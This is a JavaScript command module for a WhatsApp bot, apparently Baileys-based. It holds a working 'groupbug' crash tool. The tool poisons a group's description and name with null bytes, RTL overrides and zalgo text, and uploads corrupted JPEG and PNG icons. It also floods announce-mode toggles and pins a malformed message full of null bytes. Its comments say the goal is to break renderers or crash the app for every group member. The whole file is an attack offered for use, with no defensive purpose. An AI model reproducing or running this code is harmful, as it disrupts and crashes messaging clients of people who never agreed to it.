module.exports = {
    name: "groupbug",
    aliases: ["metabug", "groupcrash", "gcrash"],
    category: "spicy",
    permissions: { coin: 0, group: true, owner: true },
    code: async (ctx) => {
        try {
            const sock = ctx.core || ctx.sock || ctx.client;
            const args = ctx.args || [];
            const groupJid = ctx.msg?.key?.remoteJid;

            if (!groupJid?.endsWith("@g.us")) {
                return await ctx.reply("❌ Run this inside the target group.");
            }

            const type = args[0]?.toLowerCase() || "all";

            await ctx.reply(`💥 Firing group metadata bug [${type}]...`);

            switch (type) {
                case "desc":
                    await bugDescription(sock, groupJid);
                    break;
                case "subject":
                    await bugSubject(sock, groupJid);
                    break;
                case "icon":
                    await bugIcon(sock, groupJid);
                    break;
                case "announce":
                    await bugAnnounce(sock, groupJid);
                    break;
                case "pin":
                    await bugPin(sock, groupJid);
                    break;
                case "all":
                    await bugDescription(sock, groupJid);
                    await new Promise(r => setTimeout(r, 800));
                    await bugSubject(sock, groupJid);
                    await new Promise(r => setTimeout(r, 800));
                    await bugIcon(sock, groupJid);
                    await new Promise(r => setTimeout(r, 800));
                    await bugAnnounce(sock, groupJid);
                    await new Promise(r => setTimeout(r, 800));
                    await bugPin(sock, groupJid);
                    break;
                default:
                    return await ctx.reply("❌ Types: desc, subject, icon, announce, pin, all");
            }

            await ctx.reply("✅ Group metadata bug fired.");

        } catch (e) {
            console.error("[groupbug]", e);
            await ctx.reply("❌ Failed: " + e.message);
        }
    }
};

// ── 1. DESCRIPTION OVERFLOW ──
// floods group description with malformed unicode + null bytes
// breaks the group info panel renderer for all members
async function bugDescription(sock, groupJid) {
    const zalgo = (text, intensity = 15) => {
        const above = ['\u030d','\u030e','\u0304','\u0305','\u033f','\u0311','\u0306','\u0310','\u0352','\u0357'];
        const below = ['\u0326','\u0329','\u0320','\u0324','\u0325','\u0308','\u0317','\u0318','\u031a','\u0323'];
        return text.split('').map(c => {
            let r = c;
            for (let i = 0; i < intensity; i++) r += above[Math.floor(Math.random() * above.length)];
            for (let i = 0; i < intensity; i++) r += below[Math.floor(Math.random() * below.length)];
            return r;
        }).join('');
    };

    const poison =
        '\u202E' +           // RTL override — flips entire description
        '\u2068' +           // first strong isolate
        zalgo("Welcome to the group", 20) +
        '\u200B'.repeat(1000) +  // zero width space flood
        '\uFFFD'.repeat(500) +   // replacement char flood
        '\u0000'.repeat(256) +   // null byte injection
        '\u202C'.repeat(100) +   // PDF (pop directional formatting)
        zalgo("Rules: Be respectful", 20) +
        '\uFEFF'.repeat(500);    // BOM flood

    try {
        await sock.groupUpdateDescription(groupJid, poison);
    } catch {
        // even a failed update can corrupt the cached metadata
        // try raw proto approach
        await sock.relayMessage(groupJid, {
            groupInviteMessage: {
                groupJid,
                caption: poison,
                groupName: poison
            }
        }, { messageId: `GDESC_${Date.now()}` });
    }
}

// ── 2. SUBJECT (NAME) OVERFLOW ──
// corrupted group name breaks the chat list renderer
// group appears blank or crashes the chat list on some Android versions
async function bugSubject(sock, groupJid) {
    const subjects = [
        // null byte injection
        "Group\u0000\u0000\u0000\u0000",
        // RTL + zalgo
        "\u202E\u0667\u0660\u0660\u0660",
        // emoji overflow — some renderers choke on this many
        "🔥".repeat(100),
        // invisible name (zero width only)
        "\u200B\u200C\u200D\uFEFF\u200B\u200C\u200D",
        // max length + garbage
        "A".repeat(25) + "\u0000".repeat(25)
    ];

    for (const subject of subjects) {
        try {
            await sock.groupUpdateSubject(groupJid, subject);
            await new Promise(r => setTimeout(r, 500));
        } catch {}
    }
}

// ── 3. GROUP ICON CRASH ──
// send a corrupted image as group icon
// breaks group icon renderer for all members
async function bugIcon(sock, groupJid) {
    // corrupted JPEG — valid SOI marker, invalid data
    const corruptJpeg = Buffer.concat([
        Buffer.from("FFD8FFE0", "hex"),  // JPEG SOI + APP0 marker
        Buffer.from("0000", "hex"),      // zero length (invalid)
        Buffer.alloc(2048, 0xFF),        // garbage
        Buffer.from("FFD9", "hex")       // EOI marker
    ]);

    // corrupted PNG
    const corruptPng = Buffer.concat([
        Buffer.from("89504E47 0D0A1A0A", "hex").slice(0, 8), // PNG signature
        Buffer.from("FFFFFFFF", "hex"),  // invalid IHDR length
        Buffer.alloc(2048, 0x00),        // zeroed data
    ]);

    try {
        await sock.updateProfilePicture(groupJid, corruptJpeg);
    } catch {}

    await new Promise(r => setTimeout(r, 500));

    try {
        await sock.updateProfilePicture(groupJid, corruptPng);
    } catch {}
}

// ── 4. ANNOUNCE TOGGLE FLOOD ──
// rapidly toggles announce mode (only admins can send)
// causes a metadata sync storm — all members get rapid system messages
// freezes group message list on slower devices
async function bugAnnounce(sock, groupJid) {
    for (let i = 0; i < 20; i++) {
        try {
            await sock.groupSettingUpdate(groupJid, i % 2 === 0 ? "announcement" : "not_announcement");
            await new Promise(r => setTimeout(r, 150));
        } catch {}
    }
}

// ── 5. PIN MESSAGE BUG ──
// pin a malformed message — corrupts the pinned message UI
// pinned banner at top of group breaks for all members
async function bugPin(sock, groupJid) {
    // first send the malformed message
    const fakeId = `PIN_${Date.now()}`;

    try {
        await sock.relayMessage(groupJid, {
            extendedTextMessage: {
                text: "\u202E" + "\u0000".repeat(256) + "\uFFFD".repeat(256),
                previewType: 9999,
                contextInfo: {
                    stanzaId: "\u0000".repeat(64),
                    quotedMessage: {
                        conversation: "\u0000".repeat(65535)
                    },
                    participant: "0@s.whatsapp.net"
                }
            }
        }, { messageId: fakeId });

        await new Promise(r => setTimeout(r, 500));

        // now pin it
        await sock.sendMessage(groupJid, {
            pin: {
                key: {
                    remoteJid: groupJid,
                    fromMe: false,
                    id: fakeId,
                    participant: "0@s.whatsapp.net"
                },
                type: 1, // pin
                time: 604800 // 7 days
            }
        });
    } catch {}
}